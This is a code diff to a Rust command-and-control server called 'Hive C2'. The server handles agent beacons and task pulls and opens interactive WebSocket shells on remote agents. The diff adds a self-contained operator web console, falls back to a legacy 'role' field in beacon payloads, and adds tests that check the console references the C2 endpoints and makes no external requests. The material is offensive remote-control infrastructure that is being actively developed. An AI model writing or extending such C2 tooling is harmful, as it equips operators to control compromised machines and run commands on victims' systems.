@@ -2,6 +2,13 @@ mod db;
 mod session;
 mod shell;
 
+/// Operator web console (ronda 13): a single self-contained page —
+/// inline CSS/JS/SVG, system fonts, zero external requests. Everything
+/// it renders comes from this same C2's JSON API, so opening `/` never
+/// fetches a byte from anywhere else and no click ever navigates away to
+/// raw JSON.
+const DASHBOARD_HTML: &str = include_str!("dashboard.html");
+
 use std::collections::HashMap;
 use std::net::{IpAddr, SocketAddr};
 use std::path::PathBuf;
@@ -274,11 +281,12 @@ async fn main() {
             args.rate_limit
         );
     }
-    tracing::info!("  POST /beacon    - Agent heartbeats + task results");
-    tracing::info!("  GET  /task/:id  - Task pull");
-    tracing::info!("  GET  /shell/:id - WebSocket interactive shell");
-    tracing::info!("  GET  /health    - Health check");
-    tracing::info!("  GET  /logs      - Recent activity");
+    tracing::info!("  GET  /            - Operator web console (self-contained)");
+    tracing::info!("  POST /beacon      - Agent heartbeats + task results");
+    tracing::info!("  GET  /task/:id    - Task pull");
+    tracing::info!("  GET  /shell/:id   - WebSocket interactive shell");
+    tracing::info!("  GET  /health      - Health check");
+    tracing::info!("  GET  /logs        - Recent activity");
 
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
     axum::serve(
@@ -364,25 +372,7 @@ async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
 }
 
 async fn index_handler() -> Html<&'static str> {
-    Html(
-        r#"<!DOCTYPE html>
-<html><head><title>Hive C2</title>
-<style>
-body{background:#0a0e14;color:#bfc7d5;font-family:monospace;padding:20px}
-h1{color:#73d0a0}a{color:#5ccfe6}
-.card{background:#131821;border:1px solid #1e2a3a;border-radius:6px;padding:12px;margin:8px 0}
-</style></head><body>
-<h1>HIVE C2 SERVER</h1>
-<div class=card>
-<a href=/health>/health</a> — Health check<br>
-<a href=/logs>/logs</a> — Recent activity<br>
-<a href=/admin/agents>/admin/agents</a> — Registered agents<br>
-<a href=/admin/sessions>/admin/sessions</a> — Shell sessions<br>
-<a href=/admin/metrics>/admin/metrics</a> — Operational metrics (ronda 12)<br>
-</div>
-<p style=color:#5c6773>Hive Colony v3.0 — Rust C2</p>
-</body></html>"#,
-    )
+    Html(DASHBOARD_HTML)
 }
 
 async fn logs_handler(State(state): State<AppState>) -> Json<Vec<LogEntry>> {
@@ -418,6 +408,14 @@ async fn beacon_handler(
     }
     if payload.agent_role.is_empty() {
         payload.agent_role = agent_role.to_string();
+    }
+    // Ronda 13: old-format beacons send the role as a bare "role" field,
+    // which serde(flatten) parks in `extra`. Fall back to it so the web
+    // console doesn't render legacy beacons as "unknown".
+    if payload.agent_role.is_empty() {
+        if let Some(r) = payload.extra.get("role").and_then(|v| v.as_str()) {
+            payload.agent_role = r.to_string();
+        }
     }
 
     // Stream shell results to the attached operator session, if any.
@@ -504,6 +502,54 @@ async fn admin_metrics_handler(State(state): State<AppState>) -> Json<serde_json
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn dashboard_is_served_and_self_contained() {
+        // Ronda 13: the operator console must be a single page with zero
+        // external references — no CDN scripts/styles, no remote fonts, no
+        // images fetched from third parties. Everything inline or data-URI.
+        // The only http(s) strings allowed are the W3C SVG namespace URIs
+        // used by inline <svg> elements and data-URI favicons (identifiers,
+        // never fetched).
+        assert!(DASHBOARD_HTML.contains("id=\"app\""));
+        assert!(DASHBOARD_HTML.contains("<canvas id=\"chart\">"));
+        assert!(!DASHBOARD_HTML.contains("<script src="));
+        assert!(!DASHBOARD_HTML.contains("<link rel=\"stylesheet"));
+        let offenders: Vec<&str> = DASHBOARD_HTML
+            .match_indices("http")
+            .map(|(i, _)| {
+                DASHBOARD_HTML[i..]
+                    .split(['"', '\'', ' '])
+                    .next()
+                    .unwrap_or("")
+            })
+            .filter(|s| {
+                (s.starts_with("http://") || s.starts_with("https://"))
+                    && !s.starts_with("http://www.w3.org/2000/svg")
+                    && !s.starts_with("https://www.w3.org/2000/svg")
+            })
+            .collect();
+        assert!(
+            offenders.is_empty(),
+            "dashboard must not reference external URLs: {offenders:?}"
+        );
+    }
+
+    #[test]
+    fn dashboard_wires_the_real_api_surface() {
+        // The console talks to exactly the endpoints the server implements.
+        for ep in [
+            "/health",
+            "/admin/metrics",
+            "/admin/agents",
+            "/admin/sessions",
+            "/logs",
+            "/task/",
+            "/shell/",
+        ] {
+            assert!(DASHBOARD_HTML.contains(ep), "dashboard must reference {ep}");
+        }
+    }
 
     #[test]
     fn api_key_disabled_when_empty() {
